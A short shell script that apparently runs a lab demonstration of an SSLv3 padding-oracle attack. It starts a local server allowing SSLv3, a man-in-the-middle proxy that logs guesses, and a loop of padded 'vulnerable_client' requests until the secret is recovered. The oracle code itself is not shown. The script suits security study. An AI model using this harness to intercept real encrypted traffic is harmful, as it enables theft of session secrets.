#!/bin/sh

make >/dev/null

killall flexible_server >/dev/null 2>&1
./flexible_server min_version=ssl3 server_port=5556 >/dev/null &
SRV_PID=$!

killall mitm_proxy >/dev/null 2>&1
./mitm_proxy >/dev/null 2>guesses &
PXY_PID=$!

sleep 1

P=ppppppppp
B=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

while true; do
    if ./vulnerable_client path=$P body=$B >/dev/null; then
        break
    fi
done
tail -n1 guesses

kill $SRV_PID
kill $PXY_PID
